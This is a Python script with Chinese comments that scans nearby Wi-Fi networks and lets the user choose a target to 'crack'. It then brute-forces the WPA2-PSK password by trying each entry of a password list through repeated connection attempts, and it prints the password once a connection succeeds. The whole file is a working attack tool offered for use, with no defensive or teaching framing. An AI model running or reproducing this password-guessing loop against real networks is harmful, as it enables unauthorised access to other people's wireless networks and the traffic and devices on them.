import pywifi as pwf
from pywifi import const  # 导入一个常量库
import time
from utiltool import readPwd


# 判断是否有无线网卡
def hasIface():
    wifi = pwf.PyWiFi()
    # 获取无线网卡
    ifaces = wifi.interfaces()[0]

    # 无线网卡的名字
    ifaces_name = ifaces.name()

    print(ifaces_name)
    # 判断自己的网卡是否处于连接状态
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False


# 扫描附近的WiFi
def scanWifi():
    # 返回 wifi 的ssid
    wifi = pwf.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    for i in range(4):
        time.sleep(1)
        print('\r扫描可用 WIFI 中，请稍后。。。（' + str(3 - i), end='）')
    print('\r扫描完成！\n' + '-' * 51)
    print('\r{:4}{:6}{}'.format('编号', '信号强度', 'wifi名'))
    # 扫描完成，scan_results()返回一个集，存放的是每一个wifi对象
    wifi_list = ifaces.scan_results()  # 扫描附近的WiFi
    # 存放wifi名的集合
    wifi_name_set = set()
    for wifi in wifi_list:
        # 解决乱码的问题
        wifi_name_and_signal = (100 + wifi.signal, wifi.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    # 存入列表，并按信号排序
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    # 格式化输出
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    # 返回wifi列表
    return wifi_name_list


# wifi链接
def wifiConnect(str_name):
    pwd_lst = readPwd()
    if len(pwd_lst) == 0:
        print("密码本中没有密码")
        exit(0)
    # 创建WIFI对象
    wifi = pwf.PyWiFi()
    # 获取无线网卡
    ifaces = wifi.interfaces()[0]
    # 无线网卡的名字
    # ifaces_name = ifaces.name()
    # print(ifaces_name)

    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        for pwd in pwd_lst:
            # 创建WiFi连接文件，选择要连接WiFi的名称，然后检查WiFi的开发状态，查看wifi的加密算法,一般wifi加密算法为WPA2 PSK，检查加密单元。
            profile = pwf.Profile()
            # 要连接 wif 的名字
            profile.ssid = str_name
            # 网卡的开放状态
            profile.auth = const.AUTH_ALG_OPEN
            # wifi 的加密算法，一般为 was
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            # 加密单元
            profile.cipher = const.CIPHER_TYPE_CCMP
            # 调用密码
            profile.key = pwd
            # 删除所有连接过的wifi文件
            ifaces.remove_all_network_profiles()
            # 设定新的链接文件
            tep_profile = ifaces.add_network_profile(profile)
            ifaces.connect(tep_profile)
            # wifi连接时间
            time.sleep(2)
            if ifaces.status() == const.IFACE_CONNECTED:
                print("密码已破解：", pwd)
                print("WIFI 已自动连接！！！")
                return
            else:
                print("密码破解中....密码校对：", pwd)
    else:
        print("已有WiFi链接。")


if __name__ == "__main__":
    success = False
    print('WIFI扫描'.center(50, '*'))
    wifi_lst = scanWifi()
    print("**********************WIFI破解***************************")
    # 是否退出
    isExit = False
    # 目标的编号
    target_num = -1
    while not isExit:
        try:
            isNo = False
            while not isNo:
                try:
                    target_num = int(input('请选择你要破解的WiFi：(编号：)'))
                    if target_num in range(len(wifi_lst)):
                        isNo = True
                        wifiConnect(wifi_lst[target_num][1])
                    else:
                        print("请输入范围内的编号哦。")
                except:
                    print('请输入范围内的编号哦。')
                    continue
        finally:
            n = int(input('是否退出：（是：1， 否：0）'))
            if n == 1:
                isExit = True
